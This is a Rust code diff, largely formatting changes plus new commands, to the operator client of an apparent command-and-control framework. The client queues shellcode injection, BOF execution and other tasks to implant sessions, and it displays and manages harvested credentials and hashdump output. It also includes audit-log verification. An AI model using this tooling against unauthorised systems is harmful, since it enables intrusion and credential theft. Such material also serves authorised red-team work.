-                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("getuid".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] getuid → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("getuid".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! getuid: {e}")),
                     }
                 }
                 Cmd::FetchCreds { reveal } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
-                    let url = if reveal { format!("{srv}/api/creds?reveal=1") } else { format!("{srv}/api/creds") };
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    let url = if reveal {
+                        format!("{srv}/api/creds?reveal=1")
+                    } else {
+                        format!("{srv}/api/creds")
+                    };
                     match authed(client.get(&url), token).send().await {
                         Ok(resp) => match resp.json::<Vec<serde_json::Value>>().await {
                             Ok(rows) => {
-                                log_push(&mut log_buf, &format!("server creds: {} record(s)", rows.len()));
+                                log_push(
+                                    &mut log_buf,
+                                    &format!("server creds: {} record(s)", rows.len()),
+                                );
                                 for r in rows.iter().take(50) {
-                                    let realm = r.get("realm").and_then(|v| v.as_str()).unwrap_or("");
+                                    let realm =
+                                        r.get("realm").and_then(|v| v.as_str()).unwrap_or("");
                                     let user = r.get("user").and_then(|v| v.as_str()).unwrap_or("");
-                                    let kind = r.get("kind").and_then(|v| v.as_str()).unwrap_or("?");
-                                    let secret = r.get("secret").and_then(|v| v.as_str()).unwrap_or("");
-                                    log_push(&mut log_buf, &format!("  {kind:8} {realm}\\{user}: {secret}"));
+                                    let kind =
+                                        r.get("kind").and_then(|v| v.as_str()).unwrap_or("?");
+                                    let secret =
+                                        r.get("secret").and_then(|v| v.as_str()).unwrap_or("");
+                                    log_push(
+                                        &mut log_buf,
+                                        &format!("  {kind:8} {realm}\\{user}: {secret}"),
+                                    );
                                 }
                                 if rows.len() > 50 {
-                                    log_push(&mut log_buf, &format!("  ... ({} more, use CLI /creds sync for full)", rows.len() - 50));
+                                    log_push(
+                                        &mut log_buf,
+                                        &format!(
+                                            "  ... ({} more, use CLI /creds sync for full)",
+                                            rows.len() - 50
+                                        ),
+                                    );
                                 }
                             }
                             Err(e) => log_push(&mut log_buf, &format!("! creds parse: {e}")),
@@ -569,22 +1144,41 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                         Err(e) => log_push(&mut log_buf, &format!("! creds fetch: {e}")),
                     }
                 }
-                Cmd::FetchAudit { operator, action, limit } => {
-                    let Some((ref srv, ref token)) = server else { continue; };
+                Cmd::FetchAudit {
+                    operator,
+                    action,
+                    limit,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
                     let mut qs: Vec<String> = Vec::new();
-                    if let Some(op) = &operator { qs.push(format!("operator={op}")); }
-                    if let Some(ac) = &action { qs.push(format!("action={ac}")); }
-                    if let Some(l) = limit { qs.push(format!("limit={l}")); }
-                    let url = if qs.is_empty() { format!("{srv}/api/audit") } else { format!("{srv}/api/audit?{}", qs.join("&")) };
+                    if let Some(op) = &operator {
+                        qs.push(format!("operator={op}"));
+                    }
+                    if let Some(ac) = &action {
+                        qs.push(format!("action={ac}"));
+                    }
+                    if let Some(l) = limit {
+                        qs.push(format!("limit={l}"));
+                    }
+                    let url = if qs.is_empty() {
+                        format!("{srv}/api/audit")
+                    } else {
+                        format!("{srv}/api/audit?{}", qs.join("&"))
+                    };
                     match authed(client.get(&url), token).send().await {
                         Ok(resp) => match resp.json::<Vec<serde_json::Value>>().await {
                             Ok(rows) => {
                                 log_push(&mut log_buf, &format!("audit: {} record(s)", rows.len()));
                                 for r in rows.iter().take(50) {
                                     let seq = r.get("seq").and_then(|v| v.as_u64()).unwrap_or(0);
-                                    let op = r.get("operator").and_then(|v| v.as_str()).unwrap_or("?");
-                                    let act = r.get("action").and_then(|v| v.as_str()).unwrap_or("?");
-                                    let tgt = r.get("target").and_then(|v| v.as_str()).unwrap_or("");
+                                    let op =
+                                        r.get("operator").and_then(|v| v.as_str()).unwrap_or("?");
+                                    let act =
+                                        r.get("action").and_then(|v| v.as_str()).unwrap_or("?");
+                                    let tgt =
+                                        r.get("target").and_then(|v| v.as_str()).unwrap_or("");
                                     log_push(&mut log_buf, &format!("  #{seq} {op} {act} {tgt}"));
                                 }
                             }
@@ -593,30 +1187,233 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                         Err(e) => log_push(&mut log_buf, &format!("! audit fetch: {e}")),
                     }
                 }
-                Cmd::Bof { session, name, args, data_hex } => {
+                Cmd::Bof {
+                    session,
+                    name,
+                    args,
+                    data_hex,
+                } => {
                     let Some((ref srv, ref token)) = server else {
                         log_push(&mut log_buf, "! not connected");
                         continue;
                     };
-                    let args_vec: Vec<&str> = if args.trim().is_empty() { Vec::new() } else { args.split_whitespace().collect() };
+                    let args_vec: Vec<&str> = if args.trim().is_empty() {
+                        Vec::new()
+                    } else {
+                        args.split_whitespace().collect()
+                    };
                     let cmd_json = serde_json::json!({ "type": "bof", "name": name, "args": args_vec, "data_hex": data_hex });
                     match enqueue_task(&client, srv, &session, cmd_json, token).await {
                         Ok(tid) => {
-                            log_push(&mut log_buf, &format!("[{}] bof {} → task {}", short(&session), name, tid));
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] bof {} → task {}", short(&session), name, tid),
+                            );
                             bof_updates.push(BofUpdate {
-                                name: name.clone(), args: args.clone(), status: BofState::Pending,
+                                name: name.clone(),
+                                args: args.clone(),
+                                status: BofState::Pending,
                             });
                             pending.push(PendingTask {
-                                session, task_id: tid,
+                                session,
+                                task_id: tid,
                                 kind: TaskKind::Bof { name, args },
-                                backoff: Duration::from_millis(500), last_poll: Instant::now(),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
                             });
                         }
                         Err(e) => {
                             log_push(&mut log_buf, &format!("! bof enqueue: {e}"));
-                            bof_updates.push(BofUpdate { name, args, status: BofState::Error });
+                            bof_updates.push(BofUpdate {
+                                name,
+                                args,
+                                status: BofState::Error,
+                            });
                         }
                     }
+                }
+                Cmd::Inject {
+                    session,
+                    method,
+                    pid,
+                    spawn_to,
+                    sc_hex,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    let cmd_json = serde_json::json!({
+                        "type": "inject",
+                        "method": method,
+                        "pid": pid,
+                        "spawn_to": spawn_to,
+                        "sc_hex": sc_hex,
+                    });
+                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
+                        Ok(tid) => {
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] inject m={method} pid={pid} → task {}",
+                                    short(&session),
+                                    tid
+                                ),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("inject".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! inject: {e}")),
+                    }
+                }
+                Cmd::ChannelClose { session, chan } => {
+                    let Some((ref srv, ref token)) = server else {
+                        continue;
+                    };
+                    let cmd_json = serde_json::json!({ "type": "channelclose", "chan": chan });
+                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
+                        Ok(tid) => {
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] channelclose chan={chan} → task {}",
+                                    short(&session),
+                                    tid
+                                ),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("channelclose".to_string()),
+                                backoff: Duration::from_millis(500),
+                                last_poll: Instant::now(),
+                            });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! channelclose: {e}")),
+                    }
+                }
+                Cmd::FetchTasks { session } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match fetch_tasks(&client, srv, &session, token).await {
+                        Ok(rows) => {
+                            if rows.is_empty() {
+                                log_push(
+                                    &mut log_buf,
+                                    &format!("[{}] tasks: queue empty", short(&session)),
+                                );
+                            } else {
+                                log_push(
+                                    &mut log_buf,
+                                    &format!("[{}] tasks: {} queued", short(&session), rows.len()),
+                                );
+                                for r in rows.iter().take(50) {
+                                    log_push(
+                                        &mut log_buf,
+                                        &format!("  #{} {}", r.task_id, r.command),
+                                    );
+                                }
+                                if rows.len() > 50 {
+                                    log_push(
+                                        &mut log_buf,
+                                        &format!("  ... ({} more)", rows.len() - 50),
+                                    );
+                                }
+                            }
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! tasks fetch: {e}")),
+                    }
+                }
+                Cmd::FetchProfile => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match fetch_profile(&client, srv, token).await {
+                        Ok(p) => {
+                            log_push(&mut log_buf, &format!("profile: loaded={}", p.loaded));
+                            if let Some(name) = &p.name {
+                                log_push(&mut log_buf, &format!("  name: {name}"));
+                            }
+                            if let Some(samples) = p.samples.as_ref() {
+                                if !samples.is_empty() {
+                                    log_push(
+                                        &mut log_buf,
+                                        &format!("  samples: {}", samples.len()),
+                                    );
+                                }
+                            }
+                            for (k, v) in p.extra.iter() {
+                                log_push(&mut log_buf, &format!("  {k}: {v}"));
+                            }
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! profile fetch: {e}")),
+                    }
+                }
+                Cmd::FetchAuditVerify => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match audit_verify(&client, srv, token).await {
+                        Ok(ok) => {
+                            if ok {
+                                log_push(&mut log_buf, "audit verify: hash chain OK");
+                            } else {
+                                log_push(
+                                    &mut log_buf,
+                                    "! audit verify: chain BROKEN — see server logs",
+                                );
+                            }
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! audit verify: {e}")),
+                    }
+                }
+                Cmd::CredAdd {
+                    realm,
+                    user,
+                    kind,
+                    secret,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match cred_add(&client, srv, &realm, &user, &kind, &secret, token).await {
+                        Ok(()) => {
+                            log_push(&mut log_buf, &format!("cred added: {kind} {realm}\\{user}"))
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! cred add: {e}")),
+                    }
+                }
+                Cmd::CredDelete { realm, user, kind } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match cred_delete(&client, srv, &realm, &user, &kind, token).await {
+                        Ok(true) => log_push(
+                            &mut log_buf,
+                            &format!("cred deleted: {kind} {realm}\\{user}"),
+                        ),
+                        Ok(false) => log_push(
+                            &mut log_buf,
+                            &format!("cred delete: no match {kind} {realm}\\{user}"),
+                        ),
+                        Err(e) => log_push(&mut log_buf, &format!("! cred delete: {e}")),
+                    }
+                }
+                Cmd::RefreshSessions => {
+                    // Reset the change-detection signature so the next fetch
+                    // unconditionally pushes a snapshot even if nothing changed.
+                    last_session_sig.clear();
+                    log_push(&mut log_buf, "sessions: forced refresh");
                 }
             }
         }
@@ -654,10 +1451,20 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                 if changed {
                     last_session_sig = sig;
                 }
-                if changed || connected_changed || !log_buf.is_empty() || !bof_updates.is_empty() || !console_lines.is_empty() {
+                if changed
+                    || connected_changed
+                    || !log_buf.is_empty()
+                    || !bof_updates.is_empty()
+                    || !console_lines.is_empty()
+                {
                     let _ = to_ui.send(take_snapshot(
-                        &mut log_buf, true, &list, &mut bof_updates, &mut console_lines,
-                        connecting, connect_stage,
+                        &mut log_buf,
+                        true,
+                        &list,
+                        &mut bof_updates,
+                        &mut console_lines,
+                        connecting,
+                        connect_stage,
                     ));
                 }
             }
@@ -672,8 +1479,13 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                 }
                 log_push(&mut log_buf, &format!("! sessions: {e}"));
                 let _ = to_ui.send(take_snapshot(
-                    &mut log_buf, false, &[], &mut bof_updates, &mut console_lines,
-                    connecting, connect_stage,
+                    &mut log_buf,
+                    false,
+                    &[],
+                    &mut bof_updates,
+                    &mut console_lines,
+                    connecting,
+                    connect_stage,
                 ));
             }
         }
@@ -685,19 +1497,31 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                 still_pending.push(t);
                 continue;
             }
-            let PendingTask { session, task_id, kind, backoff, .. } = t;
+            let PendingTask {
+                session,
+                task_id,
+                kind,
+                backoff,
+                ..
+            } = t;
             match poll_result(&client, srv, &session, task_id, token).await {
                 Ok(Some(out)) => match kind {
                     TaskKind::Generic(name) => {
                         if !out.is_empty() {
-                            log_push(&mut log_buf, &format!("[{}] {}: {}", short(&session), name, out));
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] {}: {}", short(&session), name, out),
+                            );
                             console_lines.push((session.clone(), out));
                         }
                     }
                     TaskKind::Ls => {
                         if !out.is_empty() {
                             let entries = crate::parse::parse_any_files(&out);
-                            log_push(&mut log_buf, &format!("[{}] ls loaded {} items", short(&session), entries.len()));
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] ls loaded {} items", short(&session), entries.len()),
+                            );
                             if let Ok(mut files) = crate::widgets::file_tree::FILES.write() {
                                 *files = entries;
                             }
@@ -706,7 +1530,10 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                     TaskKind::Ps => {
                         if !out.is_empty() {
                             let entries = crate::parse::parse_any_procs(&out);
-                            log_push(&mut log_buf, &format!("[{}] ps loaded {} items", short(&session), entries.len()));
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] ps loaded {} items", short(&session), entries.len()),
+                            );
                             if let Ok(mut procs) = crate::widgets::process_table::PROCS.write() {
                                 *procs = entries;
                             }
@@ -732,7 +1559,14 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                                     e.source = session.clone();
                                 }
                             }
-                            log_push(&mut log_buf, &format!("[{}] parsed {} credentials", short(&session), entries.len()));
+                            log_push(
+                                &mut log_buf,
+                                &format!(
+                                    "[{}] parsed {} credentials",
+                                    short(&session),
+                                    entries.len()
+                                ),
+                            );
                             // Merge by (source, principal, kind): a re-run of hashdump
                             // refreshes the same principal+kind in place, while a hash
                             // and a cleartext password for the same principal (different
@@ -767,9 +1601,16 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                         }
                     }
                     TaskKind::Bof { name, args } => {
-                        let status = if out.starts_with("[error]") { BofState::Error } else { BofState::Done };
+                        let status = if out.starts_with("[error]") {
+                            BofState::Error
+                        } else {
+                            BofState::Done
+                        };
                         if !out.is_empty() {
-                            log_push(&mut log_buf, &format!("[{}] bof {}: {}", short(&session), name, out));
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] bof {}: {}", short(&session), name, out),
+                            );
                         }
                         bof_updates.push(BofUpdate { name, args, status });
                     }
@@ -777,13 +1618,21 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                 Ok(None) => {
                     let next = backoff.saturating_mul(2).min(Duration::from_secs(4));
                     still_pending.push(PendingTask {
-                        session, task_id, kind, backoff: next, last_poll: Instant::now(),
+                        session,
+                        task_id,
+                        kind,
+                        backoff: next,
+                        last_poll: Instant::now(),
                     });
                 }
                 Err(e) => {
                     log_push(&mut log_buf, &format!("[{}] ! {}", short(&session), e));
                     if let TaskKind::Bof { name, args } = kind {
-                        bof_updates.push(BofUpdate { name, args, status: BofState::Error });
+                        bof_updates.push(BofUpdate {
+                            name,
+                            args,
+                            status: BofState::Error,
+                        });
                     }
                 }
             }
@@ -895,19 +1744,154 @@ async fn poll_result(
     token: &Option<String>,
 ) -> anyhow::Result<Option<String>> {
     let rs: Vec<ResultView> = authed(
-        c.get(format!("{server}/api/results")).query(&[("session", session)]),
+        c.get(format!("{server}/api/results"))
+            .query(&[("session", session)]),
         token,
     )
     .send()
     .await?
     .json()
     .await?;
-    Ok(rs.into_iter().find(|r| r.task_id == task_id).map(|r| match r.kind.as_str() {
-        "output" => r.text,
-        "ok" => String::new(),
-        "error" => format!("[error] {}", r.text),
-        other => format!("[{other}] {}", r.text),
-    }))
+    Ok(rs
+        .into_iter()
+        .find(|r| r.task_id == task_id)
+        .map(|r| match r.kind.as_str() {
+            "output" => r.text,
+            "ok" => String::new(),
+            "error" => format!("[error] {}", r.text),
+            other => format!("[{other}] {}", r.text),
+        }))
+}
+
+#[derive(Deserialize)]
+struct TaskRow {
+    task_id: u64,
+    command: String,
+}
+
+/// `GET /api/tasks?session=<hex>` — list the queued task batch for a session.
+/// Used by `/tasks` and the live queue overlay. Mirrors the TUI's behavior.
+async fn fetch_tasks(
+    c: &reqwest::Client,
+    server: &str,
+    session: &str,
+    token: &Option<String>,
+) -> anyhow::Result<Vec<TaskRow>> {
+    let rs: Vec<TaskRow> = authed(
+        c.get(format!("{server}/api/tasks"))
+            .query(&[("session", session)]),
+        token,
+    )
+    .send()
+    .await?
+    .json()
+    .await?;
+    Ok(rs)
+}
+
+/// Best-effort view of the malleable-C2 profile response. The server may return
+/// any subset of fields depending on the loaded profile (`loaded=false` when
+/// none); we deserialize permissively so a sparse response still surfaces the
+/// `loaded` flag without forcing every other field to be Option<Vec<...>>.
+#[derive(Deserialize)]
+struct ProfileView {
+    #[serde(default)]
+    loaded: bool,
+    #[serde(default)]
+    name: Option<String>,
+    #[serde(default)]
+    samples: Option<Vec<String>>,
+    #[serde(default)]
+    extra: std::collections::BTreeMap<String, serde_json::Value>,
+}
+
+/// `GET /api/profile` — fetch the loaded profile metadata. Used by `/profile`.
+async fn fetch_profile(
+    c: &reqwest::Client,
+    server: &str,
+    token: &Option<String>,
+) -> anyhow::Result<ProfileView> {
+    Ok(authed(c.get(format!("{server}/api/profile")), token)
+        .send()
+        .await?
+        .json()
+        .await?)
+}
+
+/// `GET /api/audit/verify` — verify the audit hash chain. Returns the `ok`
+/// boolean so the UI can surface pass/fail. The server may also attach a count
+/// of records verified; we ignore the rest.
+#[derive(Deserialize)]
+struct AuditVerifyView {
+    ok: bool,
+}
+
+/// `GET /api/audit/verify`.
+async fn audit_verify(
+    c: &reqwest::Client,
+    server: &str,
+    token: &Option<String>,
+) -> anyhow::Result<bool> {
+    let v: AuditVerifyView = authed(c.get(format!("{server}/api/audit/verify")), token)
+        .send()
+        .await?
+        .json()
+        .await?;
+    Ok(v.ok)
+}
+
+/// `POST /api/creds` — add a credential. Server returns `{ "ok": true, "key":
+/// [realm, user, kind] }`; we ignore the key on success.
+async fn cred_add(
+    c: &reqwest::Client,
+    server: &str,
+    realm: &str,
+    user: &str,
+    kind: &str,
+    secret: &str,
+    token: &Option<String>,
+) -> anyhow::Result<()> {
+    let body = serde_json::json!({
+        "realm": realm,
+        "user": user,
+        "kind": kind,
+        "secret": secret,
+    });
+    let _ack: serde_json::Value = authed(c.post(format!("{server}/api/creds")).json(&body), token)
+        .send()
+        .await?
+        .json()
+        .await?;
+    Ok(())
+}
+
+/// `POST /api/creds/delete` — delete by composite key. Returns whether the
+/// row was actually deleted (false on no-match, true on hit).
+async fn cred_delete(
+    c: &reqwest::Client,
+    server: &str,
+    realm: &str,
+    user: &str,
+    kind: &str,
+    token: &Option<String>,
+) -> anyhow::Result<bool> {
+    let body = serde_json::json!({
+        "realm": realm,
+        "user": user,
+        "kind": kind,
+    });
+    let ack: serde_json::Value = authed(
+        c.post(format!("{server}/api/creds/delete")).json(&body),
+        token,
+    )
+    .send()
+    .await?
+    .json()
+    .await?;
+    Ok(ack
+        .get("deleted")
+        .and_then(|v| v.as_bool())
+        .unwrap_or(false))
 }
 
 // `session_signature` is imported from `nyx_rest` (see the `use` above) —
@@ -947,9 +1931,14 @@ mod tests {
         // Cmd::Connect now carries an optional bearer token. This pins the
         // signature so a future refactor can't silently drop it (the original
         // auth-header bug was exactly this: the field didn't exist).
-        let c = Cmd::Connect { server: "http://x".into(), password: Some("sekret".into()) };
+        let c = Cmd::Connect {
+            server: "http://x".into(),
+            password: Some("sekret".into()),
+        };
         match c {
-            Cmd::Connect { password: Some(p), .. } => assert_eq!(p, "sekret"),
+            Cmd::Connect {
+                password: Some(p), ..
+            } => assert_eq!(p, "sekret"),
             _ => panic!("wrong variant"),
         }
     }
@@ -957,7 +1946,10 @@ mod tests {
     #[test]
     fn connect_cmd_allows_no_token() {
         // Local dev server (no NYX_TOKEN) → password is None; must not error.
-        let c = Cmd::Connect { server: "http://x".into(), password: None };
+        let c = Cmd::Connect {
+            server: "http://x".into(),
+            password: None,
+        };
         match c {
             Cmd::Connect { password: None, .. } => {}
             _ => panic!("wrong variant"),
@@ -978,10 +1970,26 @@ mod tests {
         // change the signature — otherwise stale UI.
         let base = vec![sv("s1", "h", "u", 0, 1)];
         let sig0 = session_signature(&base);
-        assert_ne!(sig0, session_signature(&vec![sv("s1", "h", "u", 0, 2)]), "pending change");
-        assert_ne!(sig0, session_signature(&vec![sv("s1", "h", "u", 1, 1)]), "admin change");
-        assert_ne!(sig0, session_signature(&vec![sv("s1", "h2", "u", 0, 1)]), "host change");
-        assert_ne!(sig0, session_signature(&vec![sv("s2", "h", "u", 0, 1)]), "id change");
+        assert_ne!(
+            sig0,
+            session_signature(&vec![sv("s1", "h", "u", 0, 2)]),
+            "pending change"
+        );
+        assert_ne!(
+            sig0,
+            session_signature(&vec![sv("s1", "h", "u", 1, 1)]),
+            "admin change"
+        );
+        assert_ne!(
+            sig0,
+            session_signature(&vec![sv("s1", "h2", "u", 0, 1)]),
+            "host change"
+        );
+        assert_ne!(
+            sig0,
+            session_signature(&vec![sv("s2", "h", "u", 0, 1)]),
+            "id change"
+        );
     }
 
     #[test]
